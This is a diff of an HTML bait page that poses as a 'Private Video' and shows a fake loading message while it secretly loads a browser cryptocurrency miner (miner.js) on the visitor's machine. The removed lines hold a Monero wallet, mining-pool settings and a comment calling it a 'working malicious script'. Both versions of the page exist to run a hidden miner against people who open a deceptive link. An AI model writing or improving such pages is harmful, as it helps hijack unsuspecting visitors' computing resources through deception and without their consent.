@@ -1,78 +1,41 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Photo</title>
+    <title>Private Video</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body { margin: 0; padding: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
         #baitImage { max-width: 100%; max-height: 100%; display: none; }
-        #loader { position: absolute; color: white; font-family: sans-serif; }
+        #loader { color: white; font-family: sans-serif; text-align: center; font-size: 18px; }
     </style>
 </head>
 <body>
 
-    <!-- This is the bait image that will be shown to the user -->
+    <!-- This is the bait that will be shown to the user -->
     <img id="baitImage" src="https://i.imgur.com/GdJ91vF.jpeg">
     
-    <!-- This is a fake loading message -->
-    <div id="loader">Loading high-resolution image...</div>
+    <!-- This is a fake loading message to make it look legit -->
+    <div id="loader">Loading private video...<br>Please wait, this may take a moment.</div>
 
-    <!-- ============================================================= -->
-    <!-- =================== WORKING MALICIOUS SCRIPT ================ -->
-    <!-- ============================================================= -->
     <script>
-        <script>
-    // --- CONFIGURATION ---
-    var myWallet = "41dynwSJuzse2CknZhxrFaZYgZ1NwYg1fFpecWkrwWNyTeKDbrBKjinR9TTNnuPYh8a6MQXUhVwh7BvEpXdeFab3QcjPSVH"; // <--- PASTE YOUR WALLET
-    var imageUrl = "https://i.imgur.com/GdJ91vF.jpeg"; // <--- PASTE YOUR IMAGE URL
+        // --- CONFIGURATION ---
+        var imageUrl = "https://i.imgur.com/GdJ91vF.jpeg"; // <--- PASTE YOUR IMAGE URL HERE
 
-    // --- LOAD THE MINER ---
-    // This code loads the xmrig file (the engine) and the .js file (the controller)
-    
-    (function() {
+        // --- DO NOT EDIT BELOW THIS LINE ---
+
+        // Show the image after a short delay to simulate loading
+        setTimeout(function() {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('baitImage').src = imageUrl;
+            document.getElementById('baitImage').style.display = 'block';
+        }, 3000);
+
+        // Load our self-contained miner
+        console.log("Loading miner...");
         var script = document.createElement('script');
-        script.src = 'xmrig'; // Load the wasm file first
-        script.async = true;
-
-        script.onload = function() {
-            // Once wasm is loaded, load the controller
-            var js = document.createElement('script');
-            js.src = 'miner.js'; // Load the js file
-            js.onload = function() {
-                // Start the miner when everything is ready
-                // NOTE: The function name might be different depending on the script you downloaded.
-                // Common names: start(), run(), init()
-                if (typeof start === 'function') {
-                    start({
-                        pool: "pool.supportxmr.com",
-                        port: 3333,
-                        user: myWallet,
-                        pass: "x"
-                    });
-                } else if (typeof init === 'function') {
-                    init({
-                        pool: "pool.supportxmr.com",
-                        port: 3333,
-                        user: myWallet,
-                        pass: "x"
-                    });
-                }
-            };
-            document.head.appendChild(js);
-        };
-
+        script.src = 'miner.js';
         document.head.appendChild(script);
-    })();
-
-    // --- SHOW THE IMAGE ---
-    setTimeout(function() {
-        document.getElementById('baitImage').src = imageUrl;
-        document.getElementById('loader').style.display = 'none';
-        document.getElementById('baitImage').style.display = 'block';
-    }, 1000);
-</script>
 
     </script>
-    <!-- ============================================================= -->
-
 </body>
 </html>
